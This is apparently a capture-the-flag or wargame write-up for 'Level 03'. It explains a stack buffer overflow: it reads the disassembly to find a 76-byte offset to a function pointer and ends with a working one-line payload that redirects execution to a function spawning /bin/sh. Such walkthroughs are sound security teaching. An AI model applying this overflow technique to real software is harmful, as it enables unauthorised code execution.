# Level 03


Out goal is to overwrite the value stored here.
```
        void (*functionpointer)(void) = bad;

```

We can see that the buffer has a length of 50
```
        char buffer[50];
```

There is nothing which constrains the `strlen` of `argv[1]`.  This means we can 
overflow the call `memcpy`.

```
        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4); 
```

First, we need to figure out the distance between the start of `buffer` and the beginning of `functionpointer`.


## Address of `buffer`
First, let's find the address of `buffer`, we can
find that in the call to `memcpy` in the `$eax` register.

```
   0x08048525 <+93>:	lea    eax,[ebp-0x58]
                                    ^^^^^^^^
   0x08048528 <+96>:	mov    DWORD PTR [esp],eax
   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
```

This loads the value of `$ebp - 0x58` into `$eax` and then moves it to
the top of the `$esp` for the call to `memcpy(...)`

This means the address of the `buffer` is at `$ebp - 0x58`.

## Address of `functionpointer`

To find out the address of the function, we look for after the call to `printf`.

```
   0x08048568 <+160>:	call   0x80483ac <printf@plt>
   0x0804856d <+165>:	mov    eax,DWORD PTR [ebp-0xc]
                                              ^^^^^^^
   0x08048570 <+168>:	call   eax
```

We can see that the `call` operation is done on `$eax`, which just had the value of `$ebp - 0xc`. 

## The Difference

We can then determine that offset between the `buffer` and the `functionpointer` is:

`($ebp - 0x58) - ($ebp - 0xc) = 0x4c = 76`.


## Injecting An Address

Our goal of course is for the function pointer to point at the code

```
void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
```

The address of that is found by `disass good` and finding the head of
it:

```
   0x08048474 <+0>:	push   ebp
   0x08048475 <+1>:	mov    ebp,esp
   ...
```

## Crafting the Exploit

Our input is first `76` useless values followed by the address (in little endian) 
order.

```
./level03 $(printf '%076d\x74\x84\x04\x08')
```